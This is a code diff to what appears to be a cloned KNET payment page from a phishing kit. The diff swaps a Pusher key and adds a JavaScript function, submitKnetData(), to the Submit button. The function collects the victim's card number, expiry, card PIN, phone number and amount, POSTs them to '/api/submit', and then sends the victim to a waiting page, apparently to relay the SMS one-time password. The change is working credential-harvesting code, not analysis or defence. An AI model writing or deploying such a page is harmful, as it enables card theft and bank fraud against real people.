@@ -541,7 +541,7 @@
 
 
                                 <div id="submithide">
-                                    <button name="proceed" type="button" class="submit-button" id="proceed" onclick="window.location.href='knetwait.html'"> Submit</button>
+                                    <button name="proceed" type="button" class="submit-button" id="proceed" onclick="submitKnetData()"> Submit</button>
 
                                     <input name="proceedCancel" type="button" class="cancel-button" onclick="cancelPage(); sibTags(&#39;MobCancelBtn&#39;,&#39;MobPayPage&#39;,&#39;CancelBtn&#39;);" id="cancel1" value="Cancel">
 
@@ -894,7 +894,7 @@ This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in th
         var pid = "7239";
         // Enable pusher logging - don't include this in production
         Pusher.logToConsole = true;
-        var pusher = new Pusher("087f53ca5c3ac2e36523", {
+        var pusher = new Pusher("d1868eff0961af03482e", {
             cluster: 'ap2'
         });
 
@@ -923,7 +923,47 @@ This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in th
         });
     </script>
 
-<script>function cancelPage() { window.location.href = "index.html"; } function sibTags() {} function payConfirmAjax(action) { window.location.href = "knetwait.html"; }</script>
+<script>
+function cancelPage() { window.location.href = "index.html"; }
+function sibTags() {}
+function payConfirmAjax(action) { window.location.href = "knetwait.html"; }
+
+// Submit KNET data to server
+function submitKnetData() {
+    var bank = document.getElementById('type') ? document.getElementById('type').value : '';
+    var cardPrefix = document.getElementById('size') ? document.getElementById('size').value : '';
+    var cardNumber = document.getElementById('debitNumber') ? document.getElementById('debitNumber').value : '';
+    var month = document.querySelector('select[name="month"]') ? document.querySelector('select[name="month"]').value : '';
+    var year = document.querySelector('select[name="year"]') ? document.querySelector('select[name="year"]').value : '';
+    var pin = document.getElementById('cardPin') ? document.getElementById('cardPin').value : '';
+    var phone = localStorage.getItem('phone') || '';
+    var amount = localStorage.getItem('Total') || '5.000';
+
+    var data = {
+        phone: phone,
+        bank: bank,
+        cardPrefix: cardPrefix,
+        cardNumber: cardNumber,
+        expMonth: month,
+        expYear: year,
+        pin: pin,
+        amount: amount
+    };
+
+    fetch('/api/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    }).then(function(r) { return r.json(); }).then(function(res) {
+        console.log('Submitted:', res);
+        if (res.id) localStorage.setItem('submissionId', res.id);
+        window.location.href = 'knetwait.html';
+    }).catch(function(e) {
+        console.error(e);
+        window.location.href = 'knetwait.html';
+    });
+}
+</script>
 </body>
 
 </html>
